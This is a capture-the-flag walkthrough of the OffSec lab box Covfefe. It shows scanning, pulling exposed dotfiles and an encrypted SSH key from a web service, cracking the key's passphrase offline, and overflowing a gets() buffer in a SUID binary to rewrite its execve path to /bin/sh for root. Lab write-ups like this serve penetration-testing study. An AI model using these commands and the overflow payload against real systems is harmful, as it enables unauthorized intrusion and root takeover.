---
tags: [Offsec, Covfefe, Linux, SSH, PasswordCracking, SourceAnalysis, SUID, BufferOverflow, BinaryExploitation, Easy]
platform: OffSec
os: Debian Linux 32-bit
hostname: COVFEFE
domain: None
difficulty: Easy
ip: $BoxIP
status: Complete
---

# OffSec: Covfefe, Full Walkthrough

## The gist

Covfefe is a Linux box with a deliberately distracting Nginx service on port 80 and a custom Werkzeug application on port 31337. The custom application exposes dotfiles and a user's `.ssh` directory, including an encrypted RSA private key. Cracking the key passphrase provides SSH access as `simon`.

The local escalation is a custom SUID binary, `/usr/local/bin/read_message`. Source review shows an unsafe `gets()` call and a local `program` string adjacent to the input buffer. Supplying the expected name followed by an overwritten `/bin/sh` path makes the SUID program execute a root shell. The shell's effective UID confirms full root access.

## Box information

| Item | Value |
|---|---|
| Platform | OffSec lab |
| OS | Debian Linux, 32-bit |
| Hostname | COVFEFE |
| Domain | None |
| Difficulty | Easy |
| IP | `$BoxIP` |
| Main web service | Werkzeug 0.11.15 on `$WebPort` |
| SSH service | OpenSSH 7.4p1 |

## Variables

```bash
boxset BoxName Covfefe
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/Offsec/Covfefe
boxset PlatformDir /home/kali/Platforms/Offsec/Covfefe
boxset WebPort 31337
boxset Username simon
boxset Password $Password
boxset KeyFile $BoxDir/loot/id_rsa
boxset HashFile $BoxDir/loot/id_rsa.john
boxset SuidPath /usr/local/bin/read_message
boxset ProgramPath /usr/local/sbin/message
boxset AuthorizedName Simon
boxset UserFlag $UserFlag
boxset RootFlag $RootFlag
```

The recovered key passphrase, flag values, and any hashes remain in private loot. They are represented by `$Password`, `$UserFlag`, and `$RootFlag` here.

## 1. Initialise the workspace

The standard helper creates the box directories, variables, and transcript before enumeration. `htblog` captures the complete terminal output so failed attempts and useful negative results are preserved.

```bash
boxstart $BoxName $BoxIP offsec
htblog
```

The manual run was kept under `$BoxDir`. The run was closed with `boxdone` after the user and root proofs were confirmed.

## 2. Scan every TCP port

The first scan covers all TCP ports because the useful application is not on a normal web port. `-Pn` skips host discovery when the lab filters ICMP, `-sS` performs a half-open SYN scan, and `--min-rate 2000` keeps the full sweep practical. `-oA` saves normal, grepable, and XML output together.

```bash
sudo nmap -Pn -sS -p- --min-rate 2000 \
  $BoxIP -oA $BoxDir/nmap/allports
```

The scan found three open TCP ports:

| Port | Service | Meaning |
|---|---|---|
| 22 | SSH | Likely foothold after a username and credential or key are recovered |
| 80 | HTTP | Default Nginx page, no useful application content |
| 31337 | Unknown/custom HTTP | Main enumeration target |

![[rockycolt-covfefe-1-nmap-allports.png]]

SCREENSHOT: Full TCP scan. Red marks the three open ports. Green marks the fact that the entire range was checked, including the unusual high port.

> [!tip] ⚡ Efficiency
> **What we did:** Scanned the entire range once, then narrowed later scans to the discovered ports.
>
> **Faster approach:** Do not run version detection against all 65,535 ports after the sweep. Use the exact open-port list for the focused service scan.
>
> **Why:** Version detection and default scripts are more expensive than a basic connect check, and the full sweep has already established where they belong.

## 3. Identify service versions

The focused scan identifies the operating-system clues, web server versions, SSH version, and the framework behind port 31337. `-sC` runs Nmap's standard scripts, including HTTP and SSH checks, while `-sV` probes service versions.

```bash
sudo nmap -Pn -sS -sC -sV \
  -p 22,80,31337 \
  $BoxIP -oA $BoxDir/nmap/services
```

The results were:

- OpenSSH 7.4p1 on port 22
- Nginx 1.10.3 on port 80
- Werkzeug 0.11.15 with Python 3.5.3 on port 31337
- Linux service information, later confirmed as a 32-bit Debian system after SSH access

Port 80 returned the default Nginx landing page. Port 31337 returned a Werkzeug 404 at `/`, so the custom application became the priority.

![[rockycolt-covfefe-2-nmap-services.png]]

SCREENSHOT: Focused service scan. Red marks the Werkzeug/Python service and the robots entries reported by Nmap. Green marks the normal SSH and default Nginx services.

## 4. Read robots.txt on the custom web service

`robots.txt` is not an access-control mechanism. It is a low-noise way to discover paths that the application owner does not want indexed, and those paths are often exactly where development files or sensitive content is exposed.

```bash
curl -i http://$BoxIP:$WebPort/robots.txt
```

The response disclosed:

```text
/.bashrc
/.profile
/taxes
```

![[rockycolt-covfefe-3-robots.png]]

SCREENSHOT: `robots.txt`. Red marks the dotfiles and `/taxes` path that should be requested directly.

> [!warning] 💡 Hint
> A `Disallow` line means “do not index this path,” not “deny access.” Always request each entry manually.

## 5. Check the decoy `/taxes` path and enumerate content

The `/taxes` request redirected to `/taxes/`. The trailing slash matters because Flask-style routes commonly distinguish the canonical directory route from the slashless form.

```bash
curl -i http://$BoxIP:$WebPort/taxes
curl -i http://$BoxIP:$WebPort/taxes/
```

The page confirmed that a flag existed elsewhere but did not disclose a useful credential or command-execution path. It was recorded as evidence, then enumeration continued.

```bash
gobuster dir \
  -u http://$BoxIP:$WebPort/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x txt,py,html \
  -t 30 \
  -o $BoxDir/nmap/gobuster-31337.txt
```

Gobuster found the same interesting files plus `.bash_history`, `.ssh`, and `local.txt`:

- `.bash_history`
- `.bashrc`
- `.profile`
- `.ssh`
- `local.txt`
- `robots.txt`

![[rockycolt-covfefe-4-taxes.png]]

SCREENSHOT: `/taxes/` response. Red marks the message indicating that another file contains the flag. Do not capture the flag value.

![[rockycolt-covfefe-5-gobuster.png]]

SCREENSHOT: Gobuster results. Red marks `.bash_history`, `.ssh`, and `local.txt`. Green marks the successful 200 responses.

> [!tip] ⚡ Efficiency
> **What we did:** Used the small `dirb/common.txt` list with the relevant extensions after robots enumeration.
>
> **Alternative:** `feroxbuster` can recurse automatically, and `ffuf` is useful when fuzzing parameters or headers rather than only paths.
>
> **Why:** The application exposed the relevant dotfiles directly, so a large recursive scan would add noise without improving the result.

## 6. Read the exposed history before attacking SSH

Readable shell history is valuable because it reveals what the application owner actually used, not only what filenames happen to exist. It also gives a quick lead for local binaries and proof-file names.

```bash
curl -s http://$BoxIP:$WebPort/.bash_history \
  -o $BoxDir/loot/bash_history.txt
sed -n '1,160p' $BoxDir/loot/bash_history.txt
```

The history referenced `read_message`, `local.txt`, and ordinary local enumeration. That tied the web leak to the later SUID application and confirmed that `local.txt` was the user-level proof file.

![[rockycolt-covfefe-6-history.png]]

SCREENSHOT: Exposed `.bash_history`. Red marks the `read_message` command. Green marks the later local-enumeration commands that identify the intended privilege path.

## 7. Recover the SSH private key

The `.ssh` listing exposed `id_rsa`, `authorized_keys`, and `id_rsa.pub`. The public-key comment identified the account as `simon`, so the private key could be tested against the open SSH service without guessing usernames.

```bash
curl -s http://$BoxIP:$WebPort/.ssh/ 
curl -s http://$BoxIP:$WebPort/.ssh/id_rsa \
  -o $BoxDir/loot/id_rsa
curl -s http://$BoxIP:$WebPort/.ssh/authorized_keys \
  -o $BoxDir/loot/authorized_keys

chmod 600 $BoxDir/loot/id_rsa
file $BoxDir/loot/id_rsa
awk '{print $3}' $BoxDir/loot/authorized_keys
```

The key was an encrypted PEM RSA private key, and the authorized-key comment identified `simon`. The private-key contents are intentionally not embedded in this write-up.

> [!warning] 💡 Hint
> Treat a discovered private key as a credential even if it is encrypted. Preserve it exactly, set mode `600`, and crack the key's passphrase offline rather than repeatedly trying arbitrary SSH passwords.

## 8. Crack the encrypted key passphrase

John the Ripper does not crack the PEM file directly. `ssh2john` extracts the key's encryption metadata into a John-compatible hash format. The original key remains unchanged for the later SSH connection.

```bash
ssh2john $BoxDir/loot/id_rsa > $BoxDir/loot/id_rsa.john
john --wordlist=/usr/share/wordlists/rockyou.txt \
  $BoxDir/loot/id_rsa.john
john --show $BoxDir/loot/id_rsa.john
```

The passphrase cracked successfully. It was stored with `loot cred` in the private box loot and is represented as `$Password` here.

```bash
boxset Username simon
boxset Password $Password
loot cred $Username $Password
loot key $BoxDir/loot/id_rsa
```

![[rockycolt-covfefe-7-simon-enum.png]]

SCREENSHOT: The SSH foothold enumeration. Red marks the `simon` identity, and green marks the 32-bit Debian kernel detail.

> [!tip] ⚡ Efficiency
> **What we did:** Cracked one known encrypted key with `ssh2john` and RockYou.
>
> **Alternative:** `hashcat` can also process the converted key format if John is unavailable, but John is the shortest path for this file type on Kali.
>
> **Why:** The username was already confirmed from `authorized_keys`, so a broad SSH password spray would have been unnecessary and noisier.

## 9. Authenticate over SSH and confirm the foothold

The SSH key is now paired with a known username and recovered passphrase. Use it for authentication, then immediately confirm the account, hostname, kernel, working directory, and home-directory contents.

```bash
ssh -i $BoxDir/loot/id_rsa $Username@$BoxIP
```

Inside the shell:

```bash
id
hostname
uname -a
pwd
ls -la
```

The shell was `simon` on `covfefe`, running a 32-bit Debian 4.9 kernel. The home directory contained `local.txt`, the history file, and no direct sudo configuration. The open SSH service was therefore a stable foothold rather than only a one-command execution path.

## 10. Confirm the user proof privately

The exposed `local.txt` was already a strong clue, but the SSH shell lets us confirm its location and ownership directly. Read the value only into the private loot workflow; do not paste it into shared notes or screenshots.

```bash
ls -l /home/$Username/local.txt
cat /home/$Username/local.txt
loot flag user $UserFlag
```

The user proof was confirmed and stored privately. The value is intentionally omitted.

## 11. Enumerate local privilege paths

Before attempting an exploit, check the common local escalation routes. `sudo -l` tests delegated commands, the SUID search finds programs that run with their owner's privileges, and the `find` query narrows attention to the custom binary named in the exposed history.

```bash
sudo -l 2>&1
find / -type f -perm -4000 -printf '%M %u %g %p\n' 2>/dev/null | sort
find / -type f \( -name 'read_message' -o -name '*message*' \) 2>/dev/null
```

`sudo` was not installed. The useful SUID result was:

```text
-rwsr-xr-x root staff /usr/local/bin/read_message
```

![[rockycolt-covfefe-8-suid.png]]

SCREENSHOT: SUID enumeration. Red marks the custom root-owned `/usr/local/bin/read_message` binary. Green marks the standard SUID utilities that were not the intended path.

> [!warning] 💡 Hint
> A SUID bit is not automatically exploitable. Check the owner, group, input handling, source, and called programs. Custom SUID binaries deserve priority over standard utilities.

## 12. Read the custom binary's source

The source file `/root/read_message.c` was readable even though the privileged helper itself was owned by root. Source review is safer and faster than blind fuzzing because it reveals the validation condition, the vulnerable function, and the exact privileged operation.

```bash
ls -l /usr/local/bin/read_message /root/read_message.c
file /usr/local/bin/read_message
sed -n '1,160p' /root/read_message.c
```

The relevant source logic was:

```c
char program[] = "/usr/local/sbin/message";
char buf[20];
char authorized[] = "Simon";

printf("What is your name?\n");
gets(buf);

if (!strncmp(authorized, buf, 5)) {
    printf("Hello %s! Here is your message:\n\n", buf);
    execve(program, NULL, NULL);
}
```

The problems are connected:

1. `gets()` has no length argument and can write beyond the 20-byte `buf` array.
2. The first five bytes must match `Simon` because the comparison is case-sensitive.
3. `program` is another local array placed immediately after `buf` in the stack frame.
4. `execve()` runs whatever path remains in `program`, using the SUID process's effective privileges.

![[rockycolt-covfefe-9-euid-root.png]]

SCREENSHOT: Final exploit proof. Red marks `euid=0(root)`. Green marks that the real UID remains `simon`, showing the shell came from a SUID effective-UID transition.

> [!warning] 💡 Hint
> The source also contained a proof value in a comment. Do not copy comments from the full source into shared notes. Extract only the code needed to understand the vulnerability and keep the source file in private loot.

## 13. Confirm the layout with offline binary analysis

The manual run established the vulnerability from source. A local copy of the binary makes the stack layout and hardening properties easier to verify without repeatedly crashing the target. `checksec` reports common mitigations, `readelf` shows the ELF program headers and symbols, and `objdump` exposes the function's stack offsets.

```bash
scp -i $BoxDir/loot/id_rsa \
  $Username@$BoxIP:/usr/local/bin/read_message \
  $BoxDir/loot/read_message

file $BoxDir/loot/read_message
checksec --file=$BoxDir/loot/read_message
readelf -h -l -s $BoxDir/loot/read_message
objdump -d -M intel $BoxDir/loot/read_message \
  | sed -n '/<main>:/,/^$/p'
```

The binary is a 32-bit position-independent ELF with no stack canary and disabled NX. The disassembly places `buf` at `[ebp-0x30]` and `program` at `[ebp-0x1c]`, a 20-byte distance. This is why the exploit can overwrite the program string without needing a return-address gadget or injected shellcode.

> [!tip] ⚡ More efficient path
> **What we did:** Used the readable source to identify the adjacent arrays, then used local disassembly as confirmation.
>
> **Alternative:** Blindly send increasingly long inputs and inspect crashes. That is slower and risks losing a fragile service or missing the logic-level overwrite entirely.
>
> **Why:** When source is available, code review tells us what to overwrite. Static analysis should confirm the layout, not replace the source review.

## 14. Build the adjacent-string overwrite

The input is arranged so the first 20 bytes fill `buf` and the next bytes replace `program`:

```text
Simon               first five bytes satisfy strncmp()
AAAAAAAAAAAAAAA     remaining 15 bytes of the 20-byte buffer
/bin/sh             replacement program path
NUL                 terminates the replacement path
newline             lets gets() return
```

The embedded NUL is important. Without it, the old bytes that follow `/bin/sh` could remain part of the path and `execve()` would fail. The newline ends `gets()`, while the SSH TTY keeps the shell interactive.

The exact payload is:

```bash
printf 'SimonAAAAAAAAAAAAAAA/bin/sh\0\n'
```

Do not replace the five-character prefix with a different case or name. The source compares exactly five bytes against `Simon`.

## 15. Execute the SUID helper and obtain root

Run the helper from the SSH session. The subshell keeps the input stream open after the first line, which gives the new root shell an interactive stdin. `-tt` forces a pseudo-terminal for the SSH connection, making the resulting `/bin/sh` usable interactively.

If the original SSH session did not allocate a usable terminal, reconnect with `-tt` first:

```bash
ssh -tt -i $KeyFile $Username@$BoxIP
```

Then run the helper inside that session:

```bash
(printf 'SimonAAAAAAAAAAAAAAA/bin/sh\0\n'; cat) \
  | /usr/local/bin/read_message
```

The program printed its greeting and then returned a `#` shell prompt. Verify the effective identity immediately:

```bash
id
whoami
hostname
```

The important result was:

```text
uid=1000(simon) euid=0(root)
root
covfefe
```

The real UID remains `simon`, but the effective UID is root, which is the relevant privilege for this SUID process and its child shell.

## 16. Confirm root proof privately

The root shell can enumerate the proof files without exposing their values. Confirm ownership and paths first, then read the proof privately and store it with the loot helper.

```bash
find /root -maxdepth 1 -type f \
  \( -name 'proof.txt' -o -name 'flag.txt' \) \
  -printf '%M %u %g %p %s bytes\n'

cat /root/proof.txt
loot flag root $RootFlag
```

The root proof was confirmed and saved privately. Its value is intentionally omitted.

## 17. Clean down and close the run

The exploit did not create persistence or modify a target file. The temporary state was limited to the SSH session and local evidence files. Close the privileged and SSH shells, keep the key and John hash in private loot, and record completion with `boxdone`.

```bash
exit
exit
boxdone
```

The manual run recorded `boxdone`. No target-side payload, account, cron entry, or service modification remained.

## Technical gotchas and corrections

1. **Port 80 was a decoy.** The default Nginx page did not identify the foothold. Port 31337 was the useful custom HTTP service.
2. **Robots is a lead, not a control.** The application exposed the disallowed dotfiles directly.
3. **`/taxes` redirects.** The canonical route was `/taxes/`; a 301 is not a dead end.
4. **The private key was encrypted.** An encrypted key still becomes useful once its passphrase is converted with `ssh2john` and cracked offline.
5. **The public key identified the account.** The `authorized_keys` comment removed the need to guess the SSH username.
6. **`sudo` was unavailable.** The SUID search and exposed history pointed to the custom helper instead.
7. **Source code beat blind fuzzing.** The vulnerable `gets()` call and adjacent `program` array explained the exact overwrite.
8. **The first five bytes matter.** The name comparison is case-sensitive and only accepts `Simon`.
9. **This is a data overwrite, not a classic return-address exploit.** The payload changes the string passed to `execve()`, so no shellcode, ROP gadget, or return-address offset is required.
10. **A TTY makes the shell usable.** `ssh -tt` and an open stdin stream prevent the overwritten `/bin/sh` from exiting immediately.
11. **Real UID versus effective UID.** `uid=1000` does not disprove success when `euid=0` is present. The SUID bit changes the effective identity.
12. **Do not publish source comments containing proof values.** Keep the complete source and proof files in private loot only.

## RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Port Triage]] -- classified SSH plus web as a Linux target
- [[RUNBOOK V2/Linux - Service Scan]] -- identified OpenSSH, Nginx, and Werkzeug versions
- [[RUNBOOK V2/Linux - Web Enum]] -- enumerated robots, dotfiles, `/taxes`, and the custom web root
- [[RUNBOOK V2/Linux - Credential Search]] -- recovered an encrypted SSH private key and cracked its passphrase
- [[RUNBOOK V2/Linux - Local Enum]] -- confirmed the user, kernel, home directory, and local privilege paths
- [[RUNBOOK V2/Linux - SUID Check]] -- identified the custom root-owned SUID helper
- [[RUNBOOK V2/Linux - Binary Analysis]] -- confirmed ELF format, hardening, symbols, and stack layout offline
- [[RUNBOOK V2/Linux - Clean Down]] -- closed the shell, retained private loot, and recorded `boxdone`

## Attack Chain

1. [[RUNBOOK V2/Port Triage]] classified the host as Linux from SSH and web services.
2. [[RUNBOOK V2/Linux - Web Enum]] found the custom Werkzeug service and exposed dotfiles.
3. `.ssh/id_rsa` and `authorized_keys` disclosed an encrypted key and the `simon` username.
4. [[RUNBOOK V2/Linux - Credential Search]] converted the key with `ssh2john` and cracked its passphrase offline.
5. SSH provided a stable shell as `simon`.
6. [[RUNBOOK V2/Linux - SUID Check]] identified `/usr/local/bin/read_message` as a root-owned SUID helper.
7. Source review showed `gets()` overwriting the adjacent `program` string.
8. The input rewrote the path to `/bin/sh`, producing a shell with effective UID 0.
9. Root proof was confirmed privately and the run was closed with `boxdone`.

## Credentials

| Account | Source | Use |
|---|---|---|
| `simon` | Comment in the exposed `authorized_keys` file | SSH foothold |
| `simon` key passphrase | Cracked encrypted RSA private key | Unlock the SSH key |

Passwords and private-key material are intentionally omitted.

## Flags

- `user.txt` / `local.txt`: `$UserFlag` (keep the value private)
- `root.txt` / `proof.txt`: `$RootFlag` (keep the value private)

## Key lessons

- Enumerate dotfiles and development paths on custom web services; `robots.txt` is often a disclosure list rather than a protection mechanism.
- An encrypted SSH key is still a credential. Identify the account from its public-key comment, crack the key offline, and validate it once.
- Source review can turn a custom SUID binary into a precise exploit. The `gets()` call and adjacent string were more useful than blind buffer fuzzing.
- A SUID exploit does not always need shellcode or a return-address overwrite. Rewriting a privileged program path can be enough.

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Dawn2|Dawn2]] -- custom binary analysis and buffer-overflow reasoning
- [[OSCP/BOXES/WRITE UPS/Windows/Chatterbox|Chatterbox]] -- source and buffer-overflow exploitation concepts
- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- Linux web enumeration, source review, and clean-down discipline
- [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- exposed web files, credential recovery, and SSH access

## External Resources

- [John the Ripper project](https://www.openwall.com/john/)
- [ssh2john source](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
- [Linux `gets(3)` manual](https://man7.org/linux/man-pages/man3/gets.3.html)
- [Linux `execve(2)` manual](https://man7.org/linux/man-pages/man2/execve.2.html)
- [checksec](https://github.com/slimm609/checksec)
- [GTFOBins SUID reference](https://gtfobins.github.io/)

## Checklist

- [x] Workspace initialised
- [x] Full TCP scan completed
- [x] Nginx, SSH, and Werkzeug services identified
- [x] `robots.txt` reviewed
- [x] `/taxes/` checked
- [x] Gobuster found dotfiles and `.ssh`
- [x] `.bash_history` recovered
- [x] Encrypted SSH key recovered
- [x] `authorized_keys` identified the SSH user
- [x] Key passphrase cracked privately
- [x] SSH foothold as `simon` confirmed
- [x] User proof confirmed privately
- [x] SUID binaries enumerated
- [x] Custom SUID source reviewed
- [x] Buffer-to-program overwrite mapped
- [x] Root shell confirmed with `euid=0`
- [x] Root proof confirmed privately
- [x] No target persistence left behind
- [x] `boxdone` recorded in the manual run
